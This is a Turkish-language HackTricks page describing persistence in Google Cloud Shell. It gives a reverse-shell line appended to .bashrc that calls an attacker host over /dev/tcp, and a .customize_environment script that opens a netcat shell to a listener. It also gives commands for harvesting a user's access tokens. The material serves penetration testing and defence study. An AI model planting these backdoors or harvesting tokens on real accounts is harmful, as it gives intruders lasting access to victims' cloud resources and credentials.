# GCP - Cloud Shell Kalıcılığı

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)'i **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)'a **PR göndererek paylaşın**
*
*
*
* &#x20;github repos.

</details>

## Cloud Shell

Daha fazla bilgi için kontrol edin:

{% content-ref url="../gcp-services/gcp-cloud-shell-enum.md" %}
[gcp-cloud-shell-enum.md](../gcp-services/gcp-cloud-shell-enum.md)
{% endcontent-ref %}

### Kalıcı Arka Kapı

[**Google Cloud Shell**](https://cloud.google.com/shell/), tarayıcınızdan doğrudan bulut kaynaklarınıza komut satırı erişimi sağlar ve herhangi bir ilişkili maliyet olmadan kullanılabilir.

Google'ın Cloud Shell'ine **web konsolu**ndan veya **`gcloud cloud-shell ssh`** komutunu çalıştırarak erişebilirsiniz.

Bu konsol, saldırganlar için bazı ilginç yeteneklere sahiptir:

1. **Google Cloud'a erişimi olan herhangi bir Google kullanıcısı**, tam yetkilendirilmiş bir Cloud Shell örneğine erişebilir (Hizmet Hesapları, hatta orgun sahipleri bile).
2. Söz konusu örnek, **en az 120 gün boyunca ana dizinini koruyacaktır** eğer hiçbir etkinlik olmazsa.
3. Bu örneğin etkinliğini **bir kuruluşun izlemesi için yetenek yoktur**.

Bu temel olarak, bir saldırganın kullanıcının ana dizinine bir arka kapı yerleştirebileceği ve kullanıcının en az 120 günde bir GC Shell'e bağlandığı sürece arka kapının hayatta kalacağı ve saldırganın her çalıştırıldığında bir kabuk alacağı anlamına gelir:

{% code overflow="wrap" %}
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
{% endcode %}

Ev klasöründe var olan bir başka dosya olan **`.customize_environment`** adlı bir dosya, varsa, kullanıcının **bulut kabuğuna her eriştiğinde** (önceki teknikte olduğu gibi) **çalıştırılacaktır**. Kalıcılığı sağlamak için önceki arka kapıyı veya aşağıdaki gibi birini ekleyin ve kullanıcı "sık sık" bulut kabuğunu kullandığı sürece kalıcılığı sürdürün:
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
{% hint style="warning" %}
Önemli bir not olarak belirtmek gerekir ki, **kimlik doğrulama gerektiren bir işlem ilk kez gerçekleştirildiğinde**, kullanıcının tarayıcısında bir yetkilendirme penceresi açılır. Bu pencere, komut çalışmadan önce kabul edilmelidir. Eğer beklenmedik bir pencere açılırsa, şüphe uyandırabilir ve kullanılan kalıcılık yöntemini tehlikeye atabilir.
{% endhint %}

Bu, (saldırgan olarak) cloud shell'den `gcloud projects list` komutunu çalıştırırken tarayıcının kullanıcı oturumunda görünen pop-up'tır:


<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ancak, eğer kullanıcı aktif olarak cloudshell'i kullanmışsa, pop-up görünmeyecek ve kullanıcının **token'larını toplayabilirsiniz**:
```bash
gcloud auth print-access-token
gcloud auth application-default print-access-token
```
#### SSH bağlantısının nasıl kurulduğu

Temel olarak, bu 3 API çağrısı kullanılır:

* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey) \[POST] (yerel olarak oluşturduğunuz genel anahtarını eklemenizi sağlar)
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start) \[POST] (örneği başlatmanızı sağlar)
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default](https://content-cloudshell.googleapis.com/v1/users/me/environments/default) \[GET] (Google Cloud Shell'in IP adresini size söyler)

Ancak daha fazla bilgiyi [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key) adresinde bulabilirsiniz.

## Referanslar

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)
* [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da** takip edin.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)'a PR göndererek paylaşın
*
*
* &#x20;github repos.

</details>
